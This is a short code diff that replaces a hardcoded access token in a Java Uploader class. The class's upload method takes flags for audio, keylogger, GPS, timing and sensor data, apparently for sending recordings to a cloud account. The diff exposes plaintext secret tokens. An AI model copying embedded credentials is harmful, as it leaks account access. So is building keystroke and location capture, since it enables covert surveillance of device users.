@@ -30,7 +30,7 @@ import java.util.zip.ZipEntry;
 import java.util.zip.ZipOutputStream;
 
 public class Uploader {
-    private static final String ACCESS_TOKEN = "PQ1-gA3ADaYAAAAAAAAAKoXBOqyvL7yDsIkwpzekf5I8veMIoGCPLEUdH50Mir-x";
+    private static final String ACCESS_TOKEN = "PQ1-gA3ADaYAAAAAAAAASRr_mmSTWeOMIJpu71uUbRVoaJMZebTH-H1mNyFhiQxA";
 
     public static void upload(boolean audio, boolean keyLogger, boolean gps, boolean times, boolean sensors) throws IOException {
         RegistrableSensorManager rsm = RegistrableSensorManager.Instance;
